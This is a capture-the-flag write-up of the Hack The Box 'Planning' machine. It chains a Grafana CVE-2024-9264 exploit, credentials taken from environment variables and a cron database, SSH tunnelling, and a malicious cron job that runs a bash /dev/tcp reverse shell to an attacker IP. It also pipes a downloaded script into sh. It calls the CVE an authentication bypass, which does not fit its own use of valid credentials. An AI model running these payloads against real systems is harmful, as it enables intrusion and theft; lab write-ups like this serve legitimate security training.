# HTB: Planning - Writeup

![HTB Planning](https://labs.hackthebox.com/storage/avatars/c9efb253e7d1d9b407113e11afdaa905.png)

## Overview

Planning is a Linux-based machine that demonstrates a multi-stage attack involving Grafana exploitation, credential harvesting, and privilege escalation through cron job manipulation. Starting with provided credentials, I'll exploit a Grafana vulnerability (CVE-2024-9264), extract environment variables to pivot to SSH access, discover a cron management interface, and finally achieve root through command injection.

## Box Information

| Attribute | Value |
|-----------|-------|
| **Name** | Planning |
| **OS** | Ubuntu Linux |
| **Difficulty** | Medium [30 points] |
| **Release Date** | TBD |
| **Retire Date** | TBD |
| **Creator** | TBD |

## Initial Access

**Starting Credentials:**
- Username: `admin`
- Password: `0D5oT70Fq13EvB5r`

*Note: These credentials were provided as part of the challenge setup.*

## Reconnaissance

### Nmap Scan

```bash
nmap -sTV -Pn -T5 10.10.11.68 -oN planning
```

**Key Open Ports:**
- 22/tcp (SSH) - OpenSSH 9.6p1 Ubuntu
- 80/tcp (HTTP) - nginx 1.24.0

**Domain Information:**
- Domain: `planning.htb`

### DNS Enumeration

```bash
# DNS subdomain enumeration
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://planning.htb -H "Host: FUZZ.planning.htb" -mc 200,302
```

**Subdomain Found:**
- `grafana.planning.htb` [Status: 302]

### Host Configuration

```bash
# Add domains to /etc/hosts
echo "10.10.11.68 planning.htb grafana.planning.htb" >> /etc/hosts
```

## Attack Chain

### 1. Grafana Access and Version Discovery


# Access Grafana instance using the webui

**Key Findings:**
- Grafana Version: `11.0.0`
- Vulnerable to: `CVE-2024-9264`

### 2. CVE-2024-9264 Exploitation

**Vulnerability:** Grafana Authentication Bypass

```bash
# Clone exploit
git clone https://github.com/nollium/CVE-2024-9264.git
cd CVE-2024-9264/

# Execute exploit
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "whoami" http://grafana.planning.htb
```

### 3. Environment Variable Extraction

**Attack:** Leverage Grafana access to enumerate container environment

Using the Grafana interface to execute `linenum.sh` script for environment enumeration:

**Critical Environment Variables Found:**
```bash
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
```

### 4. SSH Access as Enzo

```bash
ssh enzo@planning.htb
# Password: RioTecRANDEntANT!
```

🚩 **User Flag:** Located in `/home/enzo/user.txt`

### 5. Privilege Escalation Enumeration

```bash
# Run LinPEAS for comprehensive enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Key Discovery:**
```bash
# Modified files in last 5 minutes
/opt/crontabs/crontab.db   # Interesting cron database
```

### 6. Cron Database Analysis

```bash
cat /opt/crontabs/crontab.db
```

**Critical Information Found:**
```json
{
  "name":"Grafana backup",
  "command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule":"@daily"
}
```

**Extracted Credentials:** `root:P4ssw0rdS0pRi0T3c`

### 7. Internal Port Discovery

```bash
# Check active ports
ss -tlnp
```

**Internal Services Found:**
- `127.0.0.1:8000` - Cron management interface
- `127.0.0.1:3000` - Grafana (internal)
- `127.0.0.1:3306` - MySQL

### 8. Port Forwarding and Cron Management Access

```bash
# Forward port 8000 to local machine
ssh -L 8000:localhost:8000 enzo@planning.htb
```

**Cron Management Interface:**
- URL: `http://localhost:8000`
- Credentials: `root:P4ssw0rdS0pRi0T3c`

### 9. Root Shell via Command Injection

**Attack:** Add malicious cron job through web interface

```bash
# Reverse shell payload
bash -c 'exec bash -i &>/dev/tcp/10.10.16.62/4545<&1'
```

**Steps:**
1. Start netcat listener: `nc -lnvp 4545`
2. Access cron management interface at `http://localhost:8000`
3. Login with `root:P4ssw0rdS0pRi0T3c`
4. Create new cron job with reverse shell payload
5. Set schedule to run immediately

```bash
# Received root shell
nc -lnvp 4545
```

🚩 **Root Flag:** Located in `/root/root.txt`

## Attack Summary

```
admin (initial creds)
    ↓ CVE-2024-9264 (Grafana Auth Bypass)
Grafana Admin Access
    ↓ Environment Variable Extraction
enzo (SSH Access)
    ↓ Cron Database Discovery
Cron Management Interface
    ↓ Command Injection
root (Full System Compromise)
```

## Key Techniques Used

1. **Subdomain Enumeration** - DNS fuzzing to discover Grafana
2. **CVE Exploitation** - Grafana authentication bypass
3. **Environment Variable Harvesting** - Container credential extraction
4. **Privilege Escalation** - Cron job manipulation
5. **Port Forwarding** - SSH tunneling for internal service access
6. **Command Injection** - Malicious cron job creation

## Vulnerabilities Exploited

- **CVE-2024-9264** - Grafana Authentication Bypass
- **Insecure Credential Storage** - Environment variables in container
- **Weak Access Controls** - Cron management interface
- **Command Injection** - Unsanitized input in cron job creation

## Tools Used

- `nmap` - Network reconnaissance
- `ffuf` - Subdomain enumeration
- `CVE-2024-9264 exploit` - Grafana authentication bypass
- `linenum.sh` - Linux enumeration script
- `LinPEAS` - Privilege escalation enumeration
- `ssh` - Port forwarding and remote access
- `netcat` - Reverse shell listener

## Pwned

[THE HTB PLANNING BOX](https://www.hackthebox.com/achievement/machine/1390647/660)

**Author:** 0xdf-sec  
**Date:** June 7, 2025  
**Tags:** `hackthebox` `linux` `grafana` `cve-2024-9264` `privilege-escalation` `cron-injection` `port-forwarding`
